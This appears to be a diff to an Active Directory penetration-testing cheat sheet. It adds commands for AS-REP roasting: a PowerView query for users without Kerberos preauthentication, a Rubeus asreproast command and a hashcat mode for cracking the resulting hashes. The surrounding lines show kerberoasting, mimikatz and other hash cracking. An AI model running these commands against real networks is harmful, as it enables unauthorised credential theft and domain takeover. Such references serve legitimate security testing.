@@ -206,6 +206,7 @@ PS C:\> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC
 PS C:\> Get-NetLocalGroupMember -ComputerName <computer> -GroupName "Remote Desktop Users"\
 PS C:\> Get-DomainGPO | select displayname
 PS C:\> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid
+PS C:\> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
 ```
 
 - Active Directory Module
@@ -1760,6 +1761,7 @@ $ hashcat -m 500 -a 0 md5-hashes.txt <wordlist>
 $ hashcat -m 2100 -a 0 <dcc2-hash> <wordlist>
 $ hashcat -m 5600 -a 0 <ntlm2-hash> <wordlist>
 $ hashcat -m 13100 -a 0 <kerberos-hash> <wordlist> --force
+$ hashcat -m 18200 -a 0 <asrep-hash> <wordlist>
 $ hashcat -m 22100 bitlocker-hashes.txt <wordlist> -o backup.cracked
 ```
 
@@ -2044,7 +2046,8 @@ mimikatz # misc::cmd
 ```
 C:\> .\Rubeus.exe kerberoast /stats
 C:\> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
-C:\> .\Rubeus.exe kerberoast /user:testspn /nowrap
+C:\> .\Rubeus.exe kerberoast /user:<username> /nowrap
+C:\> .\Rubeus.exe asreproast /user:<username> /nowrap /format:hashcat
 ```
 
 - DPAPI
